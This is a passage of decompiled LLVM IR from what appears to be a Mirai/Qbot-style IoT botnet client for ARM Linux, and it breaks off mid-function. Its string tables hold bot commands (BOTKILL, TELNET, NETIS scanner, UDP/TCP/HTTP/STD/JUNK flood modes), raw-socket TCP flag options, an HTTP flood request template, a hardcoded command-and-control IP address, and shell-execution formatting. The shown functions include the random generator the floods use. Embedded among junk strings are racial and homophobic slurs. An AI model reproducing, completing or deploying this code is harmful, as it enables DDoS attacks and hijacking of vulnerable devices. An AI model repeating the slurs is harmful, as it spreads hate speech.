@global_var_26bec.1083, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_26ca4.1084, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_26cf8.1085, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_26d50.1086, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_26da8.1087, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_26de8.1088, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_26e30.1089, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_26e88.1090, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_26ef4.1091, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_26f4c.1092, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_26f9c.1093, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_26fc0.1094, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_2701c.1095, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_2702c.1096, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_2705c.1097, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_27080.1098, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_270a4.1099, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_270c0.1100, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_27100.1101, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_2718c.1102, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_271d4.1103, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_2721c.1104, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_27264.1105, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_272ac.1106, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_27300.1107, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_27350.1108, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_273bc.1109, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_27410.1110, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_2746c.1111, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_274c8.1112, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_2752c.1113, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_27588.1114, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_275e4.1115, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_27640.1116, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_276a0.1117, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_276e8.1118, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_27780.1119, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_277cc.1120, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_27818.1121, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_27868.1122, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_278b0.1123, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_27904.1124, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_27954.1125, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_2799c.1126, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_279e8.1127, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_27a34.1128, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_27a7c.1129, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_27acc.1130, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_27b1c.1131, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_27b50.1132, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_27b84.1133, i32 0, i32 0)]
@global_var_26844.1136 = constant [6 x i8] c"close\00"
@global_var_2684c.1137 = constant [11 x i8] c"keep-alive\00"
@global_var_26858.1138 = constant [7 x i8] c"accept\00"
@global_var_26860.1139 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_26844.1136, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2684c.1137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_26858.1138, i32 0, i32 0)]
@global_var_27cc4.1144 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_27d04.1146 = constant [6 x i8] c"arfgG\00"
@global_var_27d0c.1147 = constant [9 x i8] c"HBiug655\00"
@global_var_27d18.1148 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_27d28.1149 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_27d3c.1150 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_27d50.1151 = constant [12 x i8] c"GJjyur67458\00"
@global_var_27d5c.1152 = constant [12 x i8] c"RYSDk747586\00"
@global_var_27d68.1153 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_27d74.1154 = constant [10 x i8] c"KHGK7985i\00"
@global_var_27d80.1155 = constant [11 x i8] c"yuituiILYF\00"
@global_var_27d8c.1156 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_27d9c.1157 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_27da8.1158 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_27db8.1159 = constant [9 x i8] c"ewqdcftr\00"
@global_var_27dc4.1160 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_27dd4.1161 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_27de0.1162 = constant [12 x i8] c"twehgbferhb\00"
@global_var_27dec.1163 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_27df8.1164 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_27e08.1165 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_27e18.1166 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_27e28.1167 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_27e34.1168 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_27e44.1169 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_27e54.1170 = constant [12 x i8] c"yteytietyue\00"
@global_var_27e60.1171 = constant [9 x i8] c"qsortEQS\00"
@global_var_27e6c.1172 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_27e7c.1173 = constant [4 x i8] c"std\00"
@global_var_27e80.1174 = constant [4 x i8] c"dts\00"
@global_var_27e84.1175 = constant [6 x i8] c"hackz\00"
@global_var_27e8c.1176 = constant [7 x i8] c"shdyed\00"
@global_var_27e94.1177 = constant [5 x i8] c"http\00"
@global_var_27e9c.1178 = constant [10 x i8] c"sghwiondc\00"
@global_var_27ea8.1179 = constant [7 x i8] c"nigger\00"
@global_var_27eb0.1180 = constant [6 x i8] c"pussy\00"
@global_var_27eb8.1181 = constant [7 x i8] c"faggot\00"
@global_var_27ec0.1182 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_27d04.1146, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_27d0c.1147, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_27d18.1148, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_27d28.1149, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_27d3c.1150, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_27d50.1151, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_27d5c.1152, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_27d68.1153, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_27d74.1154, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_27d80.1155, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_27d8c.1156, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_27d9c.1157, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_27da8.1158, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_27db8.1159, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_27dc4.1160, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_27dd4.1161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_27de0.1162, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_27dec.1163, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_27df8.1164, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_27e08.1165, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_27e18.1166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_27e28.1167, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_27e34.1168, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_27e44.1169, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_27e54.1170, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_27e60.1171, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_27e6c.1172, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_27e7c.1173, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_27e80.1174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_27e84.1175, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_27e8c.1176, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_27e94.1177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_27e9c.1178, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_27ea8.1179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_27eb0.1180, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_27eb8.1181, i32 0, i32 0)]
@global_var_27f50.1186 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_27f6c.1188 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_27f90.1193 = constant [4 x i8] c"all\00"
@global_var_27f94.1195 = constant i32 44
@global_var_27f98.1197 = constant [4 x i8] c"syn\00"
@global_var_27f9c.1199 = constant [4 x i8] c"rst\00"
@global_var_27fa0.1201 = constant [4 x i8] c"fin\00"
@global_var_27fa4.1203 = constant [4 x i8] c"ack\00"
@global_var_27fa8.1205 = constant [4 x i8] c"psh\00"
@global_var_27fac.1207 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_27fc0.1211 = constant [6 x i8] c"PONG!\00"
@global_var_27fc8.1213 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_27fd4.1216 = constant [10 x i8] c"My IP: %s\00"
@global_var_27fe0.1218 = constant [8 x i8] c"BOTKILL\00"
@global_var_27fe8.1220 = constant [13 x i8] c"Killing Bots\00"
@global_var_27ff8.1222 = constant [7 x i8] c"LOOPME\00"
@global_var_28000.1224 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_28010.1226 = constant [7 x i8] c"TELNET\00"
@global_var_28018.1228 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_28028.1230 = constant [4 x i8] c"OFF\00"
@global_var_391f0.1232 = global i32 0
@global_var_2802c.1234 = constant [5 x i8] c" OFF\00"
@global_var_28034.1236 = constant [3 x i8] c"ON\00"
@global_var_28038.1238 = constant [6 x i8] c"NETIS\00"
@global_var_28040.1240 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_2805c.1242 = constant [5 x i8] c"HOLD\00"
@global_var_28064.1245 = constant [5 x i8] c"JUNK\00"
@global_var_2806c.1247 = constant [4 x i8] c"UDP\00"
@global_var_28070.1249 = constant [5 x i8] c"HTTP\00"
@global_var_28078.1251 = constant [4 x i8] c"CNC\00"
@global_var_2807c.1253 = constant [6 x i8] c"COMBO\00"
@global_var_28084.1255 = constant [4 x i8] c"STD\00"
@global_var_28088.1257 = constant [4 x i8] c"TCP\00"
@global_var_2808c.1259 = constant [5 x i8] c"STOP\00"
@global_var_28094.1263 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_32218.1266 = local_unnamed_addr global i32 -1
@global_var_23270.1268 = constant [15 x i8] c"191.96.249.102\00"
@global_var_320e4.1269 = global [15 x i8]* @global_var_23270.1268
@global_var_320e8.1271 = local_unnamed_addr global i32 987
@global_var_280a0.1273 = constant [8 x i8] c"8.8.8.8\00"
@global_var_280a8.1276 = constant [16 x i8] c"/proc/net/route\00"
@global_var_280b8.1278 = constant [11 x i8] c"\0900000000\09\00"
@global_var_324d8.1280 = global i32 0
@global_var_280c4.1282 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_280d4.1284 = constant [7 x i8] c"SERVER\00"
@global_var_280dc.1286 = constant [7 x i8] c"ROUTER\00"
@global_var_280e4.1288 = constant i32 0
@global_var_280e8.1291 = constant [5 x i8] c"sshd\00"
@global_var_280f0.1293 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_32214.1295 = global i32 1
@global_var_28104.1298 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_28114.1300 = constant i32 47
@global_var_28194.1303 = constant [9 x i8] c"VOIDV1.0\00"
@global_var_28118.1305 = constant i32 993090331
@global_var_281a0.1310 = constant [5 x i8] c"PONG\00"
@global_var_281a8.1312 = constant [4 x i8] c"DUP\00"
@global_var_281ac.1314 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_281b8.1318 = constant i32 32
@global_var_32024.1324 = global i32 0
@global_var_13fd4.1325 = constant i32 123180
@global_var_1e0e0.1327 = constant i32 436207733
@global_var_14170.1333 = constant i32 122664
@global_var_14414.1345 = constant i32 121988
@global_var_1dc84.1346 = constant i32 -509607927
@global_var_1dacc.1356 = constant i32 -369098744
@global_var_1d92c.1360 = constant i32 167772171
@global_var_1492c.1371 = constant i32 -382910448
@global_var_1b630.1372 = constant i32 -382909968
@global_var_1907c.1373 = constant i32 -382910288
@global_var_1bb6c.1374 = constant i32 -382910224
@global_var_15c6c.1401 = constant i32 -456978431
@global_var_32044.1421 = local_unnamed_addr global i32 12
@global_var_1b690.1457 = constant i32 324206603
@global_var_16c38.1466 = constant i32 -478871519
@global_var_175c4.1478 = constant i32 -382906384
@global_var_13fdc.1487 = constant i32 -442544040
@global_var_17b84.1494 = constant i32 -442564540
@global_var_1862c.1553 = constant i32 -369098502
@global_var_19418.1584 = constant i32 -2020859901
@global_var_19504.1588 = constant i32 -494075872
@global_var_14418.1589 = constant i32 -382910336
@global_var_395d0.1593 = local_unnamed_addr global i32 0
@global_var_179f4.1606 = constant i32 -442543860
@global_var_15be0.1615 = constant i32 -369091194
@global_var_17848.1668 = constant i32 -443351028
@global_var_1aa30.1681 = constant i32 -443088884
@global_var_17778.1695 = constant i32 -382909968
@global_var_1cc88.1700 = constant i32 -382906384
@global_var_1d4e4.1743 = constant i32 -493740028
@global_var_1d50c.1744 = constant i32 -480509950
@global_var_1d538.1745 = constant i32 -473886717
@global_var_1d4c4.1746 = constant i32 -493740024
@global_var_1e09c.1772 = constant i32 -478805983
@global_var_1e97c.1803 = constant i32 -382910352
@global_var_19590.1833 = constant i32 -450904024
@global_var_1ff4c.1840 = constant i32 -442695584
@global_var_120a8.1842 = constant i32 -481099744
@global_var_20528.1852 = constant i32 -382910224
@global_var_20690.1876 = constant i32 167772324
@global_var_21530.1895 = constant i32 -504313148
@global_var_21518.1896 = constant i32 -483131392
@global_var_213c4.1897 = constant i32 -481229311
@global_var_215a0.1898 = constant i32 -477817729
@global_var_216a0.1899 = constant i32 -476034303
@global_var_218dc.1900 = constant i32 -516685812
@global_var_217d0.1901 = constant i32 -905969571
@global_var_21704.1902 = constant i32 -528203771
@global_var_21964.1903 = constant i32 -478079873
@global_var_21948.1904 = constant i32 -534704125
@global_var_218f8.1905 = constant i32 -534704125
@global_var_21890.1906 = constant i32 -483131392
@global_var_221cc.1914 = constant i32 -481296376
@global_var_222c4.1915 = constant i32 -481296376
@global_var_22348.1916 = constant i32 -369098732
@global_var_324a8.12 = external global i8*
@global_var_324de.72 = external global i8*
@global_var_324df.73 = local_unnamed_addr global i8 0
@global_var_324e0.74 = local_unnamed_addr global i8 0
@global_var_324e1.75 = local_unnamed_addr global i8 0
@global_var_324e2.76 = local_unnamed_addr global i8 0
@global_var_32088.1320 = local_unnamed_addr global i16 8
@global_var_281b4.1316 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_8108 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_8108)
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_810c = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_810c)
  %v1_810c = load i32, i32* @r0, align 4
  ret i32 %v1_810c
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_8110 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_8110)
  %v1_8110 = load i32, i32* @r0, align 4
  ret i32 %v1_8110
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_8114 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_8114)
  %v1_8114 = load i32, i32* @r0, align 4
  ret i32 %v1_8114
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_8118 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_8118)
  %v1_8118 = load i32, i32* @r0, align 4
  ret i32 %v1_8118
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_811c = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_811c)
  %v1_811c = load i32, i32* @r0, align 4
  ret i32 %v1_811c
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8120 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8120)
  %v1_8120 = load i32, i32* @r0, align 4
  ret i32 %v1_8120
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8124 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8124)
  %v1_8124 = load i32, i32* @r0, align 4
  ret i32 %v1_8124
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8128 = load i32, i32* @r0, align 4
  ret i32 %v1_8128
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_812c = load i32, i32* @r4, align 4
  store i32 %v3_812c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_324a8.12 to i32), i32* %r4.global-to-local, align 4
  %v2_8134 = load i8, i8* bitcast (i8** @global_var_324a8.12 to i8*), align 4
  %v2_8138 = icmp eq i8 %v2_8134, 0
  br i1 %v2_8138, label %dec_label_pc_8140, label %dec_label_pc_815c

dec_label_pc_8140:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* %r4.global-to-local, align 4
  %v3_8158 = inttoptr i32 %v2_8158 to i8*
  store i8 1, i8* %v3_8158, align 1
  %v2_815c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_815c

dec_label_pc_815c:                                ; preds = %entry, %dec_label_pc_8140
  %v2_815c = phi i32 [ %v3_812c, %entry ], [ %v2_815c.pre, %dec_label_pc_8140 ]
  store i32 %v2_815c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_324a8.12, { 1, 0 }
  uselistorder label %dec_label_pc_815c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8194 = load i32, i32* @global_var_3200c.22, align 4
  %v2_8198 = icmp eq i32 %v2_8194, 0
  br i1 %v2_8198, label %dec_label_pc_81b0, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_81b0

dec_label_pc_81b0:                                ; preds = %bb, %dec_label_pc_81a0
  ret i32 ptrtoint (i32* @global_var_3200c.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_3200c.22, { 1, 0 }
  uselistorder label %dec_label_pc_81b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_81d8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81f8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_13274.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 143968, i32 %arg1, i32 %v4_81d8)
  %v0_81fc = call i32 @abort()
  ret i32 %v0_81fc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_821c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_821c, i32* @global_var_324e4.29, align 4
  %v1_823c = add i32 %v0_821c, -1640531527
  store i32 %v1_823c, i32* @global_var_324e8.30, align 4
  %v1_8258 = add i32 %v0_821c, 1013904242
  store i32 %v1_8258, i32* @global_var_324ec.31, align 4
  br label %dec_label_pc_8270

dec_label_pc_8270:                                ; preds = %entry, %dec_label_pc_8270
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_82b4, %dec_label_pc_8270 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8280 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_324e4.29 to i32), i32 -12)
  %v6_8280 = inttoptr i32 %v5_8280 to i32*
  %v7_8280 = load i32, i32* %v6_8280, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8290 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_324e4.29 to i32), i32 -8)
  %v6_8290 = inttoptr i32 %v5_8290 to i32*
  %v7_8290 = load i32, i32* %v6_8290, align 4
  %v2_8294 = xor i32 %storemerge12, -1640531527
  %v2_829c = xor i32 %v2_8294, %v7_8280
  %v2_82a4 = xor i32 %v2_829c, %v7_8290
  %v5_82ac = mul nuw nsw i32 %storemerge12, 4
  %v6_82ac = add i32 %v5_82ac, ptrtoint (i32* @global_var_324e4.29 to i32)
  %v7_82ac = inttoptr i32 %v6_82ac to i32*
  store i32 %v2_82a4, i32* %v7_82ac, align 4
  %v1_82b4 = add nuw nsw i32 %storemerge12, 1
  %v7_82cc = icmp slt i32 %v1_82b4, 4096
  br i1 %v7_82cc, label %dec_label_pc_8270, label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %dec_label_pc_8270
  %v1_82d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82d8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8270, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_8314 = load i32, i32* @global_var_32220.34, align 4
  %v1_8318 = add i32 %v2_8314, 1
  %v3_8320 = urem i32 %v1_8318, 4096
  store i32 %v3_8320, i32* @global_var_32220.34, align 4
  %v4_8338 = mul nuw nsw i32 %v3_8320, 4
  %v5_8338 = add i32 %v4_8338, ptrtoint (i32* @global_var_324e4.29 to i32)
  %v6_8338 = inttoptr i32 %v5_8338 to i32*
  %v7_8338 = load i32, i32* %v6_8338, align 4
  %v6_8358 = udiv i32 %v7_8338, 228675
  store i32 %v6_8358, i32* @global_var_3221c.37, align 4
  br i1 true, label %dec_label_pc_83e8, label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry
  br label %dec_label_pc_83e8

dec_label_pc_83e8:                                ; preds = %entry, %dec_label_pc_83c8
  %v4_8408 = mul nuw nsw i32 %v3_8320, 4
  %v5_8408 = add i32 %v4_8408, ptrtoint (i32* @global_var_324e4.29 to i32)
  %v6_8408 = inttoptr i32 %v5_8408 to i32*
  %v7_8408 = load i32, i32* %v6_8408, align 4
  ret i32 %v7_8408

; uselistorder directives
  uselistorder i32 %v3_8320, { 0, 2, 1 }
  uselistorder i32* @global_var_324e4.29, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_324e4.29 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83e8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8448 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8448, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8468

dec_label_pc_8468:                                ; preds = %dec_label_pc_8468, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8460, %dec_label_pc_8468 ]
  %v2_8474 = add i32 %stack_var_-24.0, %tmp
  %v1_8478 = inttoptr i32 %v2_8474 to i8*
  %v2_8478 = load i8, i8* %v1_8478, align 1
  %v3_8478 = zext i8 %v2_8478 to i32
  store i32 %v3_8478, i32* %r0.global-to-local, align 4
  %v1_8480 = call i32 @isspace(i32 %v3_8478)
  store i32 %v1_8480, i32* %r0.global-to-local, align 4
  %v2_8488 = icmp eq i32 %v1_8480, 0
  %v1_8460 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8488, label %dec_label_pc_84a0.preheader, label %dec_label_pc_8468

dec_label_pc_84a0.preheader:                      ; preds = %dec_label_pc_8468
  %v1_8450 = add i32 %v3_8448, -1
  %v5_84ac11 = icmp slt i32 %v1_8450, %stack_var_-24.0
  br i1 %v5_84ac11, label %dec_label_pc_8520.preheader, label %dec_label_pc_84b0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84b0
  %v1_8498 = add i32 %stack_var_-20.012, -1
